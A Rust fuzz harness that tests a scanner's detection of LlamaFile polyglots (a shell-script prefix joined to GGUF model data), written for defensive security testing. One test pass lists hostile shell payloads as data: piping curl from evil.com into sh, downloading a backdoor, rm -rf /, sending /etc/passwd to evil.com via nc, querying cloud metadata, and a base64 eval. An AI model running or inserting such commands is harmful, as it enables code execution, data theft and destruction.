// fuzz_llamafile.rs — Deep LlamaFile polyglot fuzzer
//
// Exercises LlamaFile polyglot detection (shell script + GGUF):
// - Shell command injection in script prefix
// - GGUF integrity after shell boundary
// - Cross-scanner (pickle + GGUF + tokenizer)
// - Polyglot boundary edge cases
// - Injection payloads in shell section
//
// Run: cargo +nightly fuzz run fuzz_llamafile -- -max_len=65536

#![no_main]

use libfuzzer_sys::fuzz_target;
use fuzz_helpers::{builders, invariants};
use sentinel_pickle::{policy::ScanPolicy, scanner::scan_data};

fuzz_target!(|data: &[u8]| {
    if data.len() < 8 { return; }

    let policy = ScanPolicy::new(false);
    let strict = ScanPolicy::new(true);
    let mid = data.len() / 2;
    let shell_data = &data[..mid];
    let gguf_data = &data[mid..];

    // ── Pass 1: Standard LlamaFile polyglot ───────────────────────────
    let llamafile = builders::build_llamafile(shell_data, gguf_data);
    let findings = scan_data(&llamafile, &policy);
    invariants::assert_findings_valid(&findings);

    let strict_f = scan_data(&llamafile, &strict);
    assert!(strict_f.len() >= findings.len());

    // ── Pass 2: GGUF portion separately via sentinel-gguf ─────────────
    let mut gguf = b"GGUF".to_vec();
    gguf.extend_from_slice(&3u32.to_le_bytes());
    gguf.extend_from_slice(gguf_data);
    invariants::assert_gguf_findings_valid(&sentinel_gguf::scan(&gguf));

    // ── Pass 3: Shell injection payloads ──────────────────────────────
    let shell_injections: &[&[u8]] = &[
        b"curl http://evil.com | sh\n",
        b"wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd\n",
        b"rm -rf / --no-preserve-root\n",
        b"echo $(cat /etc/passwd) | nc evil.com 1234\n",
        b"python3 -c 'import os; os.system(\"id\")'\n",
        b"$(curl http://169.254.169.254/latest/meta-data/)\n",
        b"eval \"$(base64 -d <<< $(echo aWQ=))\"\n",
    ];
    for payload in shell_injections {
        let lf = builders::build_llamafile(payload, &[0; 24]);
        let _ = scan_data(&lf, &policy);
    }

    // ── Pass 4: Polyglot boundary tests ───────────────────────────────
    // Test different shell/GGUF boundary patterns
    {
        // No newline before GGUF
        let mut no_nl = b"#!/bin/sh\nexec \"$0\"".to_vec();
        no_nl.extend_from_slice(b"GGUF");
        no_nl.extend_from_slice(gguf_data);
        let _ = scan_data(&no_nl, &policy);

        // Extremely long shell prefix
        let mut long_shell = b"#!/bin/sh\n".to_vec();
        for _ in 0..100 {
            long_shell.extend_from_slice(b"echo nop\n");
        }
        long_shell.extend_from_slice(b"GGUF");
        long_shell.extend_from_slice(&gguf_data[..gguf_data.len().min(64)]);
        let _ = scan_data(&long_shell, &policy);
    }

    // ── Pass 5: Cross-scanner consistency ─────────────────────────────
    // Pass the same data through all three scanners
    {
        let _ = sentinel_gguf::scan(data);
        let _ = sentinel_tokenizer::scan(data);
        let _ = scan_data(data, &policy);
    }

    // ── Pass 6: Idempotency ───────────────────────────────────────────
    let f1 = scan_data(&llamafile, &policy);
    let f2 = scan_data(&llamafile, &policy);
    assert_eq!(f1.len(), f2.len());
});
